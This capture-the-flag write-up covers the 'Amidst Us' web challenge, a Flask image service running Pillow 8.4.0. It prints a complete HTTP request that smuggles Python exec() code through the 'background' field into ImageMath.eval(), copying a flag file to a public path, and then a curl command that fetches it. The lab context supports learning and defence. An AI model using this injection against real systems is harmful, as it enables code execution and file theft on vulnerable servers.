# Amidst Us

> The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and Bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?

---

The target is a Flask web application.

## Site Map

- `GET /`
- `POST /api/alphafy`
	- Takes a JSON body with keys `image` and `background`
		- `image` is the string of a base64-encoded image
		- `background` is an array of three integer values (RGB color)
	- Passes JSON body to `application.util.make_alpha()`

```json
POST /api/alphafy HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://localhost:1337
Content-Length: 3383
Connection: close

{
	"image": "...",
	background": [171, 205, 239]
}
```

## `util.make_alpha()`

Extracts `background` key (RGB value as a list of three integers) from JSON body and passes each value into [Pillow's](https://pillow.readthedocs.io/en/stable/) `ImageMath.eval()`. There exists an [RCE vulnerability](https://github.com/advisories/GHSA-8vj2-vxx3-667w) in the `ImageMath.eval()` function in Pillow versions before 9.0.0 that allows an attacker to execute arbitrary Python. The target's Pillow version is 8.4.0, indicating it is likely vulnerable.

```bash
$ cat requirements.txt
wheel
Pillow==8.4.0
```

The following payload will read the flag and write it to the path `/static/flag.txt`.

```http
POST /api/alphafy HTTP/1.1
Host: 206.189.126.144:31375
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://206.189.126.144:31375/
Content-Type: application/json
Origin: http://206.189.126.144:31375
Content-Length: 3521
Connection: close

{
	"image": "iVBORw0KGgo...Jggg==",
	"background": [
		"int(exec(\"f1 = open('/flag.txt'); f2 = open('/app/application/static/flag.txt', 'w'); f2.write(f1.read()); f1.close(); f2.close()\") or 1)",
		255,
		255
	]
}
```

```bash
$ curl http://206.189.126.144:31375/static/flag.txt
HTB{...}
```
	